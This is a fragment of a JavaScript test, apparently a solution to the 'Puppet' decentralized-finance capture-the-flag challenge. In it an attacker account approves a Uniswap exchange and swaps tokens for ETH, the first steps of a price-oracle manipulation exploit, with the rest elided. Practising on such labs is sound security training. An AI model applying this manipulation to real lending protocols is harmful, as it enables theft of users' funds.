...
describe('[Challenge] Puppet', function () {
    ...
    it('Exploit', async function () {
        ...
        const deadline = (await web3.eth.getBlock('latest')).timestamp * 2;
        await this.token.approve(this.uniswapExchange.address, ether('1000000'), { from: attacker });
        await this.uniswapExchange.tokenToEthSwapInput(ether('0.1'),1,deadline, {from: attacker});
